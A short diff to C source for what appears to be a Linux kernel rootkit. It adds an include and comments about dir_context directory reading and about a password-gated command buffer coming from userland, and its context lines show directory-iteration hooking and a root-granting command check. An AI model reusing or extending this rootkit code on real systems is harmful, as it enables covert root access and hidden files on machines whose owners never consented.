@@ -39,6 +39,8 @@
 #include <linux/delay.h>
 #include <linux/version.h>
 
+#include <linux/sched.h>
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
 
@@ -674,7 +676,7 @@ struct file_operations *get_fop(const char *path)
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
-
+//the dir_context struct is used to read the context of a directory from kernel space
     #define READDIR(NAME) \
         int NAME##_iterate(struct file *file, struct dir_context *context) \
         { \
@@ -763,6 +765,7 @@ int execute_command(const char __user *str, size_t length)
     // since the password matched, we assume the command following the password
     // is in the valid format
 
+    //increment the pointer position to the buffer containing the command issued from userland
     str += sizeof(CFG_PASS);
 
     if (strcmp(str, CFG_ROOT) == 0) {
